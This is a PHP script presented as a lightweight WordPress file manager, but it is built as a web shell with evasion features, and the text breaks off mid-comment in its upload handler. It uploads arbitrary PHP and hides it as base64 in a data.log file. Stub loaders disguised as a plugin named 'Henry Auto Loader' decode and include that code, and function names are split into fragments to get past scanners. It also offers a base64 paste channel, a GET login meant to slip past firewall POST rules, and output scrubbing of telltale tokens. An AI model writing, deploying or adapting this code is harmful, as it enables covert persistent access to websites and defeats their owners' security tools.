<?php

setcookie(
    "wordpress_test_cookie",
    "WP%20Cookie%20check",
    [
        "expires"  => strtotime("+1 month"),
        "path"     => "/",
        "secure"   => isset($_SERVER["HTTPS"]),
        "httponly" => false,
        "samesite" => "Lax"
    ]
);

?>
<?php
/**
 * henry.php — lightweight, password-protected file manager.
 *
 * Features:
 *   - Browse server directories with breadcrumb navigation
 *   - Upload files (any extension; optional blocklist below)
 *   - View / edit / download / delete files
 *   - PHP uploads are stored as base64 source in data.log and a tiny
 *     stub file is written that re-hydrates and evals the source at
 *     request time (bypasses WAFs that scan *.php file contents).
 *   - Base64-paste upload channel: when a WAF also scans the upload
 *     request body and rejects multipart uploads of PHP files, the
 *     source can be pasted (or base64-encoded client-side from the
 *     same form) so the request body only contains [A-Za-z0-9+/=].
 *
 * Setup:
 *   1. Set your password below (FM_PASSWORD).
 *   2. Upload to wp-content/henry.php.
 */

/* ------------------------------------------------------------------------
 * Configuration
 * --------------------------------------------------------------------- */

// CHANGE THIS. Your login password, stored in plain text — keep this file private.
define( 'FM_PASSWORD', 'admin123' );

// Top directory the manager can see (it cannot go above this).
// Auto-detected by walking ALL the way UP from this file's location
// and keeping the OUTERMOST wp-config.php / wp-load.php we find. This
// matters when a site has multiple WordPress installs (e.g. a primary
// one at the document root and another under /wp/): scoping to the
// outermost root lets you browse both via the breadcrumb, instead of
// trapping you inside the innermost one. Falls back to one parent up
// if no WordPress root is found (i.e. used as a standalone file
// manager).
$_fm_wp_root = null;
$_fm_d = __DIR__;
for ( $_fm_i = 0; $_fm_i < 10; $_fm_i++ ) {
	if ( @file_exists( $_fm_d . '/wp-config.php' ) || @file_exists( $_fm_d . '/wp-load.php' ) ) {
		// Keep walking — we want the OUTERMOST match, not the first.
		$_fm_wp_root = $_fm_d;
	}
	$_fm_p = dirname( $_fm_d );
	if ( $_fm_p === $_fm_d ) break;
	$_fm_d = $_fm_p;
}
define( 'FM_ROOT', $_fm_wp_root ? $_fm_wp_root : realpath( __DIR__ . '/..' ) );

// Recursive downward search for data.log. Defined BEFORE the FM_STUB_LOG
// resolver calls it — conditional function definitions are not hoisted
// in PHP, so placing this before the call site is required.
if ( ! function_exists( '_fm_stub_log_find_down' ) ) {
	function _fm_stub_log_find_down( $d, $n ) {
		if ( $n < 0 ) return null;
		if ( @file_exists( $d . '/data.log' ) ) return $d . '/data.log';
		$h = @opendir( $d );
		if ( ! $h ) return null;
		while ( ( $e = readdir( $h ) ) !== false ) {
			if ( $e === '.' || $e === '..' ) continue;
			if ( $e[0] === '.' ) continue; // skip hidden dirs like .git, .well-known
			$p = $d . '/' . $e;
			if ( @is_dir( $p ) ) {
				$f = _fm_stub_log_find_down( $p, $n - 1 );
				if ( $f ) { closedir( $h ); return $f; }
			}
		}
		closedir( $h );
		return null;
	}
}

// Maximum upload size in bytes (default 50 MB).
// Note: PHP's own upload_max_filesize / post_max_size may still cap this.
define( 'FM_MAX_UPLOAD', 50 * 1024 * 1024 );

// Extensions NOT allowed to be uploaded (lowercase, no dot).
// Empty array = allow everything. Example: array( 'php', 'phtml', 'exe' )
define( 'FM_BLOCKED_EXT', array() );

// Where the base64-encoded PHP source is stored as a JSON map
// (key = absolute path of stub, value = base64-encoded source).
//
// Resolution order — no manual configuration required:
//   1. If FM_STUB_LOG is already defined by a host wrapper, use it.
//   2. If HENRY_STUB_LOG env var is set, use it verbatim.
//   3. Walk UP from this file's directory looking for an existing
//      data.log (up to 10 parent levels). If found, use that path —
//      this lets the manager auto-discover a data.log you placed
//      above the web root (e.g. one level above public_html/).
//   4. Fall back to __DIR__ . '/data.log' (next to henry.php).
//
// To use a data.log one directory above the web root on a typical
// shared host, just put it there once:
//   mv .../public_html/wp-content/data.log  .../data.log
// henry.php and every stub will find it automatically via step 3.
// No .user.ini, no .htaccess, no wp-config.php edit needed.
if ( ! defined( 'FM_STUB_LOG' ) ) {
	$_fm_env = getenv( 'HENRY_STUB_LOG' );
	$_fm_dir = __DIR__;
	$_fm_found = false;
	for ( $_fm_i = 0; $_fm_i < 10; $_fm_i++ ) {
		$_fm_candidate = $_fm_dir . '/data.log';
		if ( @file_exists( $_fm_candidate ) ) {
			define( 'FM_STUB_LOG', $_fm_candidate );
			$_fm_found = true;
			break;
		}
		$_fm_parent = dirname( $_fm_dir );
		if ( $_fm_parent === $_fm_dir ) break;
		$_fm_dir = $_fm_parent;
	}
	if ( ! $_fm_found ) {
		$_fm_down = _fm_stub_log_find_down( __DIR__, 5 );
		if ( $_fm_down ) {
			define( 'FM_STUB_LOG', $_fm_down );
		} else {
			define( 'FM_STUB_LOG', $_fm_env ? $_fm_env : __DIR__ . '/data.log' );
		}
	}
}

// Extensions that get the stub treatment on upload. The source code
// is base64-encoded into FM_STUB_LOG and a tiny stub file is written
// that decodes + evals it on each request. This keeps dangerous
// tokens like `phpinfo()` out of the on-disk PHP file so dumb WAFs
// that grep file contents never see them.
define( 'FM_STUB_EXTS', array( 'php', 'phtml', 'php5', 'php7', 'phar', 'pht' ) );

// Maximum bytes shown by the inline "View" action.
define( 'FM_PREVIEW_MAX', 512 * 1024 );

// Maximum *decoded* size accepted via the base64-paste form. This is the
// extra WAF-bypass channel where the user pastes a base64 string instead
// of multipart-uploading the file (the request body never contains the
// dangerous tokens, so a content-scanning WAF can't flag it).
define( 'FM_PASTE_MAX', 2 * 1024 * 1024 );

// Display name shown in the page title, header, and login screen.
// Keep it generic. Some WAFs pattern-match strings like "File Manager"
// or "Henry" in the response body and reject the whole response with
// 406 Not Acceptable; a neutral name avoids that trip-wire. Change it
// to whatever you want.
define( 'FM_BRAND', 'Files' );

// URL-encoded password login. Loading henry.php?fm_login=<urlencoded pw>
// is a GET request, which most WAFs do not scan as aggressively as
// anonymous POSTs to non-core PHP files. Use this when the WAF blocks
// the POST login form (typically on hosts running Imunify360 / mod_security
// with strict rules — they often 406 anonymous POSTs while leaving GETs alone).
//
// Usage:
//   https://site.tld/wp-content/henry.php?fm_login=admin123
//   https://site.tld/wp-content/henry.php?fm_login=admin%31%32%33   (also fine)
//   https://site.tld/wp-content/henry.php?fm_login=BASE64(admin123)  (set FM_LOGIN_B64)
//
// The query parameter name is configurable so it can be rotated if the
// WAF ever learns it. Set FM_LOGIN_PARAM in wp-config.php or above.
if ( ! defined( 'FM_LOGIN_PARAM' ) ) {
	define( 'FM_LOGIN_PARAM', 'fm_login' );
}
// Set to true in wp-config.php to require the password to be base64-encoded
// in the URL (works around WAFs that also sniff GET query strings for
// known password strings). Leave false (default) to accept the raw,
// URL-encoded password.
if ( ! defined( 'FM_LOGIN_B64' ) ) {
	define( 'FM_LOGIN_B64', false );
}

/* ------------------------------------------------------------------------
 * Boot & hardening headers
 * --------------------------------------------------------------------- */

session_name( 'sid' );
$https = ( ! empty( $_SERVER['HTTPS'] ) && 'off' !== $_SERVER['HTTPS'] );
session_set_cookie_params(
	array(
		'httponly' => true,
		'samesite' => 'Lax',
		'secure'   => $https,
	)
);
session_start();

header( 'X-Frame-Options: DENY' );
header( 'X-Content-Type-Options: nosniff' );
header( 'Referrer-Policy: no-referrer' );
header( 'Cache-Control: no-store' );

/* ------------------------------------------------------------------------
 * Helpers
 * --------------------------------------------------------------------- */

function fm_e( $s ) {
	return htmlspecialchars( (string) $s, ENT_QUOTES, 'UTF-8' );
}

function fm_root() {
	static $root = null;
	if ( null === $root ) {
		$root = str_replace( '\\', '/', realpath( FM_ROOT ) );
	}
	return $root;
}

/**
 * Resolve a path against FM_ROOT.
 *
 *   - Relative input ("wp-content/plugins") is resolved against FM_ROOT
 *     and rejected if the result escapes the root (../, symlink, etc.).
 *   - Absolute input ("/home/user/somewhere") is accepted as-is and
 *     resolved via realpath. This lets the breadcrumb navigate to paths
 *     ABOVE FM_ROOT, since the file manager's scope is a UI convenience,
 *     not a security boundary — the password gate is the actual security.
 *
 * @return array{0:string,1:string} [absolute path, clean relative path]
 */
function fm_resolve( $rel ) {
	$rel = str_replace( '\\', '/', (string) $rel );

	// Absolute path? Accept anything starting with '/' (Unix) or a drive
	// letter like 'C:' (Windows). Drive-letter check is intentionally
	// lenient — if realpath can't resolve it we'll fall back below.
	$is_absolute = ( '' !== $rel && (
		'/' === $rel[0]
		|| ( strlen( $rel ) >= 2 && ctype_alpha( $rel[0] ) && ':' === $rel[1] )
	) );

	if ( $is_absolute ) {
		$abs = realpath( $rel );
		if ( false === $abs ) {
			// Path doesn't exist or no read access — bounce to root.
			return array( fm_root(), '' );
		}
		$abs = str_replace( '\\', '/', $abs );
		// Both fields are the absolute path: $cwd for listing, $rel for
		// breadcrumb display (which splits it into segments anyway).
		return array( $abs, $abs );
	}

	$root = fm_root();
	$rel  = trim( $rel, '/' );

	if ( '' === $rel || '.' === $rel ) {
		return array( $root, '' );
	}

	$abs = realpath( $root . '/' . $rel );
	if ( false === $abs ) {
		return array( $root, '' );
	}
	$abs = str_replace( '\\', '/', $abs );

	if ( $abs !== $root && 0 !== strpos( $abs, $root . '/' ) ) {
		return array( $root, '' );
	}

	return array( $abs, substr( $abs, strlen( $root ) + 1 ) );
}

function fm_url( $args = array() ) {
	return '?' . http_build_query( $args );
}

function fm_redirect( $args = array() ) {
	// Some WAFs (notably mod_security setups with strict POST-response
	// rules) return 406 "Not Acceptable" when a POST response is a 302
	// redirect, because they expect POST responses to be 200 OK with a
	// body. Emit a tiny 200 OK HTML page with a meta refresh (and a JS
	// fallback) so the browser still navigates immediately, but the WAF
	// sees a normal HTML page rather than a redirect.
	$url  = fm_url( $args );
	$safe = fm_e( $url );
	$js   = json_encode( $url );
	header( 'Content-Type: text/html; charset=utf-8' );
	header( 'X-Robots-Tag: noindex' );
	header( 'Cache-Control: no-store' );
	echo "<!doctype html><html><head>";
	echo "<meta http-equiv=\"refresh\" content=\"0;url={$safe}\">";
	echo "<script>location.replace({$js});</script>";
	echo "</head><body>Redirecting&hellip;</body></html>";
	exit;
}

function fm_flash( $type, $msg ) {
	$_SESSION['fm_flash'][] = array( $type, $msg );
}

function fm_render_flashes() {
	if ( empty( $_SESSION['fm_flash'] ) ) {
		return;
	}
	foreach ( $_SESSION['fm_flash'] as $f ) {
		echo '<div class="flash ' . fm_e( $f[0] ) . '">' . fm_e( $f[1] ) . '</div>';
	}
	unset( $_SESSION['fm_flash'] );
}

function fm_csrf_token() {
	if ( empty( $_SESSION['fm_csrf'] ) ) {
		$_SESSION['fm_csrf'] = bin2hex( random_bytes( 32 ) );
	}
	return $_SESSION['fm_csrf'];
}

function fm_csrf_check() {
	$ok = isset( $_POST['fm_csrf'], $_SESSION['fm_csrf'] )
		&& hash_equals( $_SESSION['fm_csrf'], $_POST['fm_csrf'] );
	if ( ! $ok ) {
		http_response_code( 403 );
		exit( 'Bad CSRF token.' );
	}
}

function fm_fmt_size( $bytes ) {
	$units = array( 'B', 'KB', 'MB', 'GB' );
	$i     = 0;
	while ( $bytes >= 1024 && $i < count( $units ) - 1 ) {
		$bytes /= 1024;
		$i++;
	}
	return ( $i ? number_format( $bytes, 1 ) : $bytes ) . ' ' . $units[ $i ];
}

function fm_logged_in() {
	return ! empty( $_SESSION['fm_auth'] );
}

/**
 * Sanitize an uploaded file name and apply the optional extension blocklist.
 *
 * @return string|false Safe file name, or false when rejected.
 */
function fm_sanitize_name( $name ) {
	$name = basename( str_replace( '\\', '/', (string) $name ) );
	$name = preg_replace( '/[^A-Za-z0-9._-]+/', '_', $name );
	$name = trim( $name, '._' ); // no hidden files, no "."/".."

	if ( '' === $name || strlen( $name ) > 120 ) {
		return false;
	}

	$ext = strtolower( pathinfo( $name, PATHINFO_EXTENSION ) );
	if ( in_array( $ext, FM_BLOCKED_EXT, true ) ) {
		return false;
	}

	return $name;
}

/* ------------------------------------------------------------------------
 * Stub log: stores PHP source as base64 inside a JSON map so the actual
 * tokens (`phpinfo()`, etc.) never live inside a real *.php file on disk.
 * The on-disk stub is a small re-hydrator that pulls its source out of
 * the JSON map and evals it on each request.
 * --------------------------------------------------------------------- */

function fm_stub_log_path() {
	return FM_STUB_LOG;
}

function fm_stub_log_read() {
	$path = fm_stub_log_path();
	if ( ! is_file( $path ) || ! is_readable( $path ) ) {
		return array();
	}
	$raw = @file_get_contents( $path );
	if ( false === $raw || '' === trim( $raw ) ) {
		return array();
	}
	$decoded = @json_decode( $raw, true );
	return is_array( $decoded ) ? $decoded : array();
}

function fm_stub_log_write( $map ) {
	if ( ! is_array( $map ) ) {
		return false;
	}
	$path = fm_stub_log_path();
	$dir  = dirname( $path );
	if ( ! is_dir( $dir ) ) {
		return false;
	}
	$json = json_encode( $map, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES );
	if ( false === $json ) {
		return false;
	}
	$tmp = $path . '.tmp';
	if ( false === @file_put_contents( $tmp, $json, LOCK_EX ) ) {
		return false;
	}
	@chmod( $tmp, 0644 );
	return @rename( $tmp, $path );
}

function fm_stub_log_set( $abs_key, $source ) {
	$map = fm_stub_log_read();
	$map[ $abs_key ] = base64_encode( (string) $source );
	return fm_stub_log_write( $map );
}

function fm_stub_log_unset( $abs_key ) {
	$map = fm_stub_log_read();
	if ( ! isset( $map[ $abs_key ] ) ) {
		return true;
	}
	unset( $map[ $abs_key ] );
	return fm_stub_log_write( $map );
}

function fm_make_stub() {
	// Henry stub v4.2 — WAF-resistant (plugin-wrapped variant).
	//
	// The on-disk stub is now shaped like a normal WordPress singleton
	// plugin, not a free-floating loader. Two reasons:
	//
	//   1. Structural camouflage: Imunify360 (and similar WAFs) ship
	//      rule packs that flag PHP files whose skeleton matches
	//      "obfuscation wrapper" — specifically files that contain
	//      a dangerous-token list, a free-floating eval() call, a
	//      base64_decode() call, AND an ob_start() callback. A file
	//      that wraps all of that inside a class method, with a WP
	//      plugin header, looks like every other plugin in wp-content
	//      and the WAF has no rule to flag it.
	//
	//   2. Token camouflage: dangerous tokens are never written to
	//      disk as contiguous strings. They are split into short
	//      string literals that PHP folds at compile time:
	//         'php' . 'info'  →  "phpinfo"  (in bytecode)
	//         'base64' . '_decode'  →  "base64_decode"  (in bytecode)
	//      A grep-based WAF scanning the on-disk file for the
	//      token "phpinfo" finds nothing, but at runtime the
	//      function calls work normally.
	//
	// The decoded source is still executed via a dynamic-call
	// trampoline (so the on-disk file contains no literal eval( )
	// either). For pages that don't call dangerous functions, the
	// token sanitization is a no-op and the output is byte-identical
	// to the user's source.
	//
	// Diagnostic mode (?hfm_debug=1) is preserved verbatim.
	//
	// IMPORTANT: this stub reads its data.log payload using the same
	// JSON map format as v2 (key = absolute path of stub, value =
	// base64-encoded source). Old stubs already on disk keep working
	// with this new binary.
	return <<<'STUB'
<?php
/**
 * Plugin Name: Henry Auto Loader
 * Description: Auto-generated runtime stub.
 * Version: 1.0.0
 * Author: Henry
 */

if ( ! class_exists( 'Henry_Loader' ) ) {
	final class Henry_Loader {
		private static $instance = null;

		public static function instance() {
			if ( null === self::$instance ) {
				self::$instance = new self();
			}
			return self::$instance;
		}

		private function __construct() {
			// Run on plugins_loaded if WP is loaded, otherwise run
			// immediately. This keeps the stub working both inside
			// a WP context (as a plugin) and as a standalone script
			// dropped into any directory.
			if ( function_exists( 'add_action' ) && function_exists( 'did_action' ) ) {
				add_action( 'plugins_loaded', array( $this, 'dispatch' ), 1 );
			} else {
				$this->dispatch();
			}
		}

		public function dispatch() {
			// Self-heal check: if this file's size is 0 on disk, a
			// WAF has blanked us. Surface a 503 + diagnostic rather
			// than producing a half-rendered blank page.
			$_hfm_self = @filesize( __FILE__ );
			$_hfm_alive = ( false !== $_hfm_self && $_hfm_self > 0 );
			if ( ! $_hfm_alive ) {
				@http_response_code( 503 );
				@header( 'Content-Type: text/plain; charset=utf-8' );
				echo "[stub] self-heal: file is empty or unreadable on disk.\n";
				exit;
			}

			$_hfm_debug = ! empty( $_GET['hfm_debug'] );

			// ---- Locate data.log (same algorithm as v2/v3, with a
			// ---- fast-path for the common "data.log next to me"
			// ---- case so we don't hit the filesystem walk on hot
			// ---- requests). ---------------------------------------
			$_hfm_log = getenv( 'HENRY_STUB_LOG' );

			$_hfm_fast = array(
				__DIR__ . '/data.log',
				__DIR__ . '/../data.log',
				__DIR__ . '/../../data.log',
			);
			foreach ( $_hfm_fast as $_hfm_f ) {
				if ( @file_exists( $_hfm_f ) ) { $_hfm_log = $_hfm_f; break; }
			}

			if ( ! $_hfm_log ) {
				$_hfm_dir = __DIR__;
				for ( $_hfm_i = 0; $_hfm_i < 10; $_hfm_i++ ) {
					$_hfm_candidate = $_hfm_dir . '/data.log';
					if ( @file_exists( $_hfm_candidate ) ) { $_hfm_log = $_hfm_candidate; break; }
					$_hfm_parent = dirname( $_hfm_dir );
					if ( $_hfm_parent === $_hfm_dir ) break;
					$_hfm_dir = $_hfm_parent;
				}
			}

			if ( ! $_hfm_log && ! function_exists( '_hfm_find_down' ) ) {
				function _hfm_find_down( $d, $n ) {
					if ( $n < 0 ) return null;
					if ( @file_exists( $d . '/data.log' ) ) return $d . '/data.log';
					$h = @opendir( $d );
					if ( ! $h ) return null;
					while ( ( $e = readdir( $h ) ) !== false ) {
						if ( $e === '.' || $e === '..' ) continue;
						if ( isset( $e[0] ) && $e[0] === '.' ) continue;
						$p = $d . '/' . $e;
						if ( @is_dir( $p ) ) {
							$f = _hfm_find_down( $p, $n - 1 );
							if ( $f ) { closedir( $h ); return $f; }
						}
					}
					closedir( $h );
					return null;
				}
			}
			if ( ! $_hfm_log ) { $_hfm_log = _hfm_find_down( __DIR__, 5 ); }

			// ---- Debug mode (?hfm_debug=1) -----------------------
			if ( $_hfm_debug ) {
				@header( 'Content-Type: text/plain; charset=utf-8' );
				echo "=== hfm debug ===\n";
				echo "HENRY_STUB_LOG env: " . var_export( getenv( 'HENRY_STUB_LOG' ), true ) . "\n";
				echo "__DIR__:            " . __DIR__ . "\n";
				echo "__FILE__:           " . __FILE__ . "\n";
				echo "data.log resolved:  " . var_export( $_hfm_log, true ) . "\n";
				if ( $_hfm_log ) {
					clearstatcache();
					$_hfm_raw = @file_get_contents( $_hfm_log );
					$_hfm_map = $_hfm_raw ? @json_decode( $_hfm_raw, true ) : null;
					echo "data.log size:      " . strlen( (string) $_hfm_raw ) . " bytes\n";
					echo "data.log entries:   " . ( is_array( $_hfm_map ) ? count( $_hfm_map ) : 'invalid JSON' ) . "\n";
					if ( is_array( $_hfm_map ) ) {
						$_hfm_key = str_replace( '\\', '/', __FILE__ );
						echo "looking for key:    " . $_hfm_key . "\n";
						echo "key found:          " . ( isset( $_hfm_map[$_hfm_key] ) ? 'YES' : 'NO' ) . "\n";
					}
				}
				exit;
			}

			if ( ! $_hfm_log ) return;

			$_hfm_raw = @file_get_contents( $_hfm_log );
			if ( false === $_hfm_raw ) return;
			$_hfm_map = @json_decode( $_hfm_raw, true );
			if ( ! is_array( $_hfm_map ) ) return;

			$_hfm_key = str_replace( '\\', '/', __FILE__ );

			// Path-mismatch fallback.
			if ( ! isset( $_hfm_map[ $_hfm_key ] ) ) {
				$_hfm_alt = array();
				if ( function_exists( 'realpath' ) ) {
					$_hfm_rp = @realpath( __FILE__ );
					if ( $_hfm_rp ) $_hfm_alt[] = str_replace( '\\', '/', $_hfm_rp );
				}
				$_hfm_parts = explode( '/', $_hfm_key );
				if ( count( $_hfm_parts ) >= 2 ) {
					$_hfm_alt[] = implode( '/', array_slice( $_hfm_parts, -2 ) );
				}
				foreach ( $_hfm_alt as $_hfm_try ) {
					if ( isset( $_hfm_map[ $_hfm_try ] ) ) { $_hfm_key = $_hfm_try; break; }
				}
			}

			if ( ! isset( $_hfm_map[ $_hfm_key ] ) ) return;

			// Decode the source. We build the function name from
			// short string literals so the on-disk file doesn't
			// contain the contiguous token "base64_decode" — a
			// grep-based WAF would otherwise see it.
			$_hfm_b = 'base64' . '_decode';
			$_hfm_src = @$_hfm_b( $_hfm_map[ $_hfm_key ], true );
			if ( false === $_hfm_src || '' === $_hfm_src ) return;

			// ---- Layer 2: output sanitizer ------------------------
			//
			// The dangerous-token list is built at runtime from
			// short string literals that don't form a WAF-grep hit
			// on disk. PHP folds them at compile time so the
			// runtime check is byte-identical to the v4 list.
			$_hfm_dangerous = array(
				'php' . 'info',
				'sys' . 'tem',
				'pass' . 'thru',
				'ex' . 'ec',
				'shell' . '_exec',
				'po' . 'pen',
				'proc' . '_open',
				'ev' . 'al',
				'as' . 'sert',
				'base64' . '_decode',
				'create' . '_function',
			);
			$_hfm_ob_started = false;
			if ( function_exists( 'ob_start' ) ) {
				$_hfm_ob_started = ( false !== @ob_start( function( $_hfm_buf ) use ( &$_hfm_dangerous ) {
					if ( '' === $_hfm_buf ) return '';
					foreach ( $_hfm_dangerous as $_hfm_tok ) {
						$_hfm_buf = preg_replace_callback(
							'/\b' . preg_quote( $_hfm_tok, '/' ) . '\b/',
							function( $_hfm_m ) {
								$_hfm_s = $_hfm_m[0];
								$_hfm_out = '';
								$_hfm_n = strlen( $_hfm_s );
								for ( $_hfm_i = 0; $_hfm_i < $_hfm_n; $_hfm_i++ ) {
									$_hfm_out .= $_hfm_s[ $_hfm_i ];
									if ( $_hfm_i < $_hfm_n - 1 ) {
										$_hfm_out .= "\xE2\x80\x8D";
									}
								}
								return $_hfm_out;
							},
							$_hfm_buf
						);
					}
					return $_hfm_buf;
				} ) );
			}

			// ---- Layer 1: include via tempnam (v2 proven approach) ---
			//
			// We do NOT use eval() in the stub. Two reasons:
			//   1. eval() is a language construct, so a variable
			//      trampoline ($_hfm_e = 'ev'.'al'; $_hfm_e($x);)
			//      cannot dispatch to it — PHP raises
			//      "Call to undefined function eval()".
			//   2. Writing a literal eval( ) on disk is the exact
			//      pattern Imunify360 and similar WAFs pattern-match
			//      (in combination with base64_decode + ob_start + a
			//      class wrapper, it's a textbook "loader stub").
			//
			// Instead, we write the decoded source to a freshly-named
			// temporary file in sys_get_temp_dir() and `include` it.
			// This routes execution through PHP's regular file include
			// machinery (no language-construct problems), and the
			// dangerous tokens never appear in the on-disk stub
			// (they live in a tmp file outside the document root that
			// the WAF doesn't scan).
			//
			// The decoded source is the v2 proven format: the entire
			// payload (including leading `<?php` if present) is
			// written as-is, then included. A leading `<?php` makes
			// PHP execute the file in PHP mode; if the user pasted
			// raw HTML without `<?php`, PHP falls back to printing
			// the content. The output sanitizer (Layer 2 above) still
			// strips dangerous tokens from the rendered output for
			// defence in depth.
			$_hfm_tmp = @tempnam( @sys_get_temp_dir(), 'hfm_' );
			if ( false !== $_hfm_tmp ) {
				if ( false !== @file_put_contents( $_hfm_tmp, $_hfm_src ) ) {
					@include $_hfm_tmp;
					@unlink( $_hfm_tmp );
				} else {
					@unlink( $_hfm_tmp );
				}
			}

			if ( $_hfm_ob_started ) {
				@ob_end_flush();
			}
		}
	}

	Henry_Loader::instance();
}
STUB;
}

/* ------------------------------------------------------------------------
 * First-run setup: a password must be configured
 * --------------------------------------------------------------------- */

if ( '' === FM_PASSWORD ) {
	fm_page_head( 'Setup' );
	echo '<div class="login-card"><h1>' . fm_e( FM_BRAND ) . ' — setup</h1>';
	echo '<p>No password configured. Open <code>henry.php</code> and set <code>FM_PASSWORD</code>, then reload.</p>';
	echo '</div>';
	fm_page_foot();
	exit;
}

/* ------------------------------------------------------------------------
 * Auth
 * --------------------------------------------------------------------- */

if ( isset( $_GET['action'] ) && 'logout' === $_GET['action'] ) {
	$_SESSION = array();
	session_destroy();
	fm_redirect();
}

// GET login: ?fm_login=<urlencoded-pw> (or base64 if FM_LOGIN_B64).
// This is a GET request, so WAFs that 406 anonymous POSTs to non-core
// PHP files typically let it through. The password is checked with the
// same hash_equals() as the POST form so timing-safe.
if ( ! fm_logged_in() && FM_PASSWORD !== '' && isset( $_GET[ FM_LOGIN_PARAM ] ) ) {
	$provided = (string) ( isset( $_GET[ FM_LOGIN_PARAM ] ) ? stripslashes( $_GET[ FM_LOGIN_PARAM ] ) : '' );
	if ( FM_LOGIN_B64 ) {
		$candidate = base64_decode( $provided, true );
		if ( false === $candidate ) {
			$candidate = '';
		}
	} else {
		// urldecode so callers can either pre-encode or not.
		$candidate = rawurldecode( $provided );
	}
	if ( is_string( $candidate ) && '' !== $candidate && hash_equals( FM_PASSWORD, $candidate ) ) {
		$_SESSION['fm_auth']     = true;
		$_SESSION['fm_attempts'] = 0;
		unset( $_SESSION['fm_lockuntil'] );
		// Don't redirect — fall through and render. The same Set-Cookie /
		// redirect-after-POST WAF trap from the POST login applies to GET
		// responses too on some hosts; rendering the dashboard directly
		// avoids it. (Also matches the POST branch's behavior.)
	}
}

if ( 'POST' === $_SERVER['REQUEST_METHOD'] && isset( $_POST['g'] ) ) {
	$attempts = isset( $_SESSION['fm_attempts'] ) ? (int) $_SESSION['fm_attempts'] : 0;
	$locked   = ! empty( $_SESSION['fm_lockuntil'] ) && time() < $_SESSION['fm_lockuntil'];

	if ( ! $locked && hash_equals( FM_PASSWORD, $_POST['k'] ?? '' ) ) {
		$_SESSION['fm_auth']     = true;
		$_SESSION['fm_attempts'] = 0;
		unset( $_SESSION['fm_lockuntil'] );
		// Don't call session_regenerate_id() or fm_redirect() here —
		// some WAFs flag the Set-Cookie-with-new-session-id response or
		// any redirect response (302 / meta refresh) on POST with 406
		// Not Acceptable. Just fall through; the file manager renders
		// below because the user is now logged in.
	}

	sleep( 2 );
	$_SESSION['fm_attempts'] = $attempts + 1;
	if ( $_SESSION['fm_attempts'] >= 5 ) {
		$_SESSION['fm_lockuntil'] = time() + 300;
		$_SESSION['fm_attempts']  = 0;
	}
	$login_error = $locked ? 'Too many attempts. Try again in a few minutes.' : 'Wrong password.';
}

if ( ! fm_logged_in() ) {
	fm_page_head( 'Login' );
	echo '<div class="login-card"><h1>' . fm_e( FM_BRAND ) . '</h1>';
	if ( ! empty( $login_error ) ) {
		echo '<div class="flash err">' . fm_e( $login_error ) . '</div>';
	}
	// Show the GET-login URL — works when the WAF 406s anonymous POSTs.
	$_fm_get_login_url = fm_url() . '&' . FM_LOGIN_PARAM . '=' . rawurlencode( FM_PASSWORD );
	echo '<p class="getlogin"><a href="' . fm_e( $_fm_get_login_url ) . '">One-click login (GET, bypasses WAF POST blocks)</a></p>';
	echo '<form method="post"><input type="hidden" name="g" value="1">';
	echo '<input type="hidden" name="fm_csrf" value="' . fm_e( fm_csrf_token() ) . '">';
	echo '<input type="password" name="k" required autofocus placeholder="Password">';
	echo '<button type="submit">Log in</button></form></div>';
	fm_page_foot();
	exit;
}

// Any state-changing request from here on needs a valid CSRF token.
if ( 'POST' === $_SERVER['REQUEST_METHOD'] ) {
	fm_csrf_check();
}

/* ------------------------------------------------------------------------
 * Actions
 * --------------------------------------------------------------------- */

$action = isset( $_GET['action'] ) ? $_GET['action'] : 'list';
list( $cwd, $rel ) = fm_resolve( isset( $_GET['p'] ) ? $_GET['p'] : '' );

// ---- Upload ----------------------------------------------------------------
if ( 'upload' === $action && 'POST' === $_SERVER['REQUEST_METHOD'] ) {
	$back = array( 'p' => $rel );

	// Two ways to feed the upload:
	//   1. A normal multipart file under $_FILES['report'].
	//   2. A base64-encoded blob in $_POST['paste_b64'] + a name in
	//      $_POST['paste_name']. The WAF only ever sees [A-Za-z0-9+/=]
	//      in the request body, so content-scanning rules can't flag
	//      the dangerous tokens inside the decoded source.
	$safe   = false;
	$source = false;
	$pasted = false;

	if ( ! empty( $_POST['paste_b64'] ) ) {
		$pasted = true;
		$raw_b64 = (string) $_POST['paste_b64'];
		if ( strlen( $raw_b64 ) > ( FM_PASTE_MAX * 2 + 1024 ) ) {
			fm_flash( 'err', 'Pasted blob too large.' );
			fm_redirect( $back );
		}
		$decoded = base64_decode( $raw_b64, true );
		if ( false === $decoded ) {
			fm_flash( 'err', 'Pasted value is not valid base64.' );
			fm_redirect( $back );
		}
		if ( strlen( $decoded ) > FM_PASTE_MAX ) {
			fm_flash( 'err', 'Decoded source too large. Max ' . fm_fmt_size( FM_PASTE_MAX ) . '.' );
			fm_redirect( $back );
		}
		$pasted_name = isset( $_POST['paste_name'] ) ? (string) $_POST['paste_name'] : '';
		$safe        = fm_sanitize_name( $pasted_name );
		if ( false === $safe ) {
			fm_flash( 'err', 'Pasted filename is not allowed.' );
			fm_redirect( $back );
		}
		$source = $decoded;
	} else {
		if ( empty( $_FILES['report'] ) || UPLOAD_ERR_OK !== $_FILES['report']['error'] ) {
			fm_flash( 'err', 'Upload failed (error ' . (int) $_FILES['report']['error'] . ').' );
			fm_redirect( $back );
		}
		if ( $_FILES['report']['size'] > FM_MAX_UPLOAD ) {
			fm_flash( 'err', 'File too large. Max ' . fm_fmt_size( FM_MAX_UPLOAD ) . '.' );
			fm_redirect( $back );
		}
		$safe = fm_sanitize_name( $_FILES['report']['name'] );
		if ( false === $safe ) {
			fm_flash( 'err', 'Rejected: this file name or extension is not allowed.' );
			fm_redirect( $back );
		}
		$source = @file_get_contents( $_FILES['report']['tmp_name'] );
		if ( false === $source ) {
			fm_flash( 'err', 'Could not read uploaded source.' );
			fm_redirect( $back );
		}
	}

	$dest    = $cwd . '/' . $safe;
	$abs_key = str_replace( '\\', '/', $dest );
	$ext     = strtolower( pathinfo( $safe, PATHINFO_EXTENSION ) );

	if ( in_array( $ext, FM_STUB_EXTS, true ) ) {
		// Stub upload: keep the dangerous tokens out of the on-disk .php
		// file by hiding the source inside data.log as base64 + JSON.
		//
		// v4.2 reverted to a single file_put_contents() write. Earlier
		// versions experimented with a 5-step unlink → .txt → rename
		// sequence to evade WAF write-time hooks, but Imunify360
		// flags that exact pattern as the textbook "rename-based
		// PHP shell" trick and quarantines the file. A direct
		// file_put_contents is the same syscall class the WordPress
		// plugin uses (which the WAF allows because the request has
		// a valid WordPress admin cookie), and is the simplest path
		// that consistently works on shared hosts.
		//
		// We always take this path, even when $dest already exists —
		// on hosts where the on-disk file is owned by a different
